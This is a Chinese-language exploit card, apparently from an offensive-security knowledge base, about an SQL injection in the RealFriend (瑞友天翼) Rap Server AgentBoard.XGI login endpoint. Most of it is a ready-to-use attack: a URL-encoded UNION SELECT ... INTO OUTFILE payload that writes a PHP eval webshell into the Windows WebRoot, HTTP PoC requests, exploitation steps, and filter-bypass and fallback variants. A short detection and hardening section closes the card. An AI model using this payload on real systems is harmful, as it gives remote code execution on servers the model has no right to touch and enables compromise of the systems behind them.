---
id: web-generic-sqli-ruiyou-tianyi-agentboard-xgi-union-outfile-webshell
title: 瑞友天翼应用虚拟化 AgentBoard.XGI SQL 注入 INTO OUTFILE：Windows WebRoot 写 PHP webshell RCE
type: scenario
domain: web
path: web/generic/sqli
technique: ruijou-agentboard-xgi-union-outfile-webshell
aliases:
- 瑞友天翼 NDay
- AgentBoard.XGI SQL 注入
- Rap Server 写 webshell
- RealFriend into outfile
- 天翼应用虚拟化 RCE
tags:
- web
- sqli
- into-outfile
- webshell
- windows
- ruijou
- tianyi
- php
- rce
cve: []
severity: high
confidence: medium
status: draft
created: '2026-11-08'
updated: '2026-11-08'
---

## 一句话结论

瑞友天翼（RealFriend Rap Server）应用虚拟化系统的 `/AgentBoard.XGI` 登录接口把 `user` 参数拼进 SQL，攻击者用 `UNION SELECT` 配合 MySQL `INTO OUTFILE` 把 `<?php eval($_POST["cmd"]);?>` 写入 `C:\Program Files (x86)\RealFriend\Rap Server\WebRoot\4.php`，再访问该文件并 POST `cmd=phpinfo();` 即可执行 PHP 代码，获得服务器 RCE。

## 原理

- **入口与参数**：`/AgentBoard.XGI?user=<payload>&cmd=UserLogin` 是登录处理入口；`user` 参数进入 SQL 语句（字符串上下文），`cmd=UserLogin` 选择登录业务分支，使注入语句被执行。
- **UNION + INTO OUTFILE**：MySQL 的 `SELECT ... INTO OUTFILE '<path>'` 会把查询结果写到数据库进程有权限的路径。原文 payload 使用
  `-1' union select 1,'<?php eval($_POST["cmd"]);?>' into outfile "C:\\Program Files (x86)\\RealFriend\\Rap Server\\WebRoot\\4.php" -- -`
  ，第一列占位、第二列写入 PHP 代码，`-- -` 注释后续 SQL。
- **为什么能落地并执行**：`C:\Program Files (x86)\RealFriend\Rap Server\WebRoot\` 是 Rap Server 的 Web 根，Apache/PHP 会解析其中的 `.php`；数据库服务账户对该目录有写权限（或该目录 ACL 允许 MySQL 写入），因此文件落盘后可直接通过 HTTP 访问。
- **前置**：MySQL 账号具备 `FILE` 权限、`secure_file_priv` 允许目标路径（为空或包含该目录）、目标目录可写；若 `secure_file_priv` 限制则需换路径或使用其它写文件手法。
- **验证**：访问 `/4.php`，页面显示 PHP 版本信息（原文为 PHP 5.2.10，`Loaded Configuration File: C:\Program Files (x86)\RealFriend\Rap Server\php\php-apache2handler.ini`），随后 POST `cmd=phpinfo();` 执行任意 PHP。

## 触发条件

- 目标部署瑞友天翼应用虚拟化系统（Rap Server），`/AgentBoard.XGI` 可从网络访问。
- `user` 参数存在 SQL 注入且未被 WAF/参数化修复；MySQL 账户有 `FILE` 权限、`secure_file_priv` 允许写入 WebRoot。
- Rap Server 的 `WebRoot` 目录对 MySQL 进程可写，Apache/PHP 启用并解析 `.php`。
- 攻击者能访问写入后的文件路径（同主机 Web 端口）。
- 仅用于授权测试；原文未标注具体受影响版本。

## 利用步骤

1. 识别目标为瑞友天翼/Rap Server（页面标题、`AgentBoard.XGI` 路径、`RealFriend` 目录特征）。
2. 发送注入 payload（URL 编码），用 `INTO OUTFILE` 写入 WebRoot 下的 `.php` 文件：
   ```
   /AgentBoard.XGI?user=-1'+union+select+1,'<?php+eval($_POST["cmd"]);?>'+into+outfile+"C:\\Program+Files\\+(x86)\\+RealFriend\\Rap+Server\\WebRoot\\4.php"+--+-&cmd=UserLogin
   ```
3. 观察响应/状态；若成功，访问 `http://<target>/4.php`，应看到 PHP 解析结果（空页面或 phpinfo）。
4. POST `cmd=phpinfo();` 验证代码执行；随后可换成文件管理、命令执行或更强 webshell。
5. 若 `INTO OUTFILE` 被 `secure_file_priv` 拦截，尝试其它可写 Web 路径、日志写文件或堆叠查询（视 MySQL 版本/权限）。
6. 记录请求、写入路径与执行证据，按授权范围清理。

## PoC

```http
GET /AgentBoard.XGI?user=-1'+union+select+1,'<?php+eval($_POST["cmd"]);?>'+into+outfile+"C:\\Program+Files\\+(x86)\\+RealFriend\\Rap+Server\\WebRoot\\4.php"+--+-&cmd=UserLogin HTTP/1.1
Host: target
```

```http
POST /4.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

cmd=phpinfo();
```

```text
# 原文结果：/4.php 返回 phpinfo，PHP Version 5.2.10，
# Loaded Configuration File: C:\Program Files (x86)\RealFriend\Rap Server\php\php-apache2handler.ini
# 证明 webshell 落地并执行。
```

原文 target 地址打码，payload 按原文还原；未在本机/授权目标执行。

## 变体与关联

- 变体：写入文件名/路径可换（如 `WebRoot\shell.php`、其它子目录）；用十六进制/CHAR() 编码绕过引号过滤；用 `-- -`/`#` 注释；若 UNION 列数不同，调整占位列。
- 变体：同一产品的其它 `.XGI` 接口/参数可能存在类似注入，可按 `cmd=` 分支枚举。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]、[[web-generic-sqli-mysql-outfile-filename-clause-injection]]、[[web-generic-sqli-order-by-into-outfile-filename-webshell]]——通用 MySQL INTO OUTFILE 写 webshell 技巧；本卡是瑞友天翼产品的具体 NDay 入口与 Windows 路径。
- 关联：[[web-php-rce-upload-chr-ascii-webshell-waf-bypass]]（PHP 写马的另一路径）。
- 边界：`secure_file_priv` 非空且不含目标路径、MySQL 无 FILE 权限、WebRoot 不可写、WAF 拦截 `union/into outfile`、或产品已修复注入时失效。

## 检测与防御

- 检测：`AgentBoard.XGI` 请求中出现 `union`、`into outfile`、`secure_file_priv`、`php` 代码、Windows 路径（`RealFriend`、`WebRoot`）；WebRoot 目录短时间出现新 `.php` 文件。
- 检测：MySQL 进程写入 Web 目录、数据库账户执行 `SELECT ... INTO OUTFILE`；访问新 PHP 文件后出现 `phpinfo`/命令执行。
- 防御：升级/修补瑞友天翼产品；对 `user` 参数使用参数化查询；最小化数据库账户权限（去掉 FILE）、设置 `secure_file_priv` 到专用目录。
- 防御：WebRoot 目录禁止数据库进程写入；WAF 拦截 SQL 注入关键字；对上传/写入文件做完整性监控。
- 加固：Web 服务最小权限运行，关闭不必要写权限；定期扫描 Web 目录中的异常 PHP 文件。
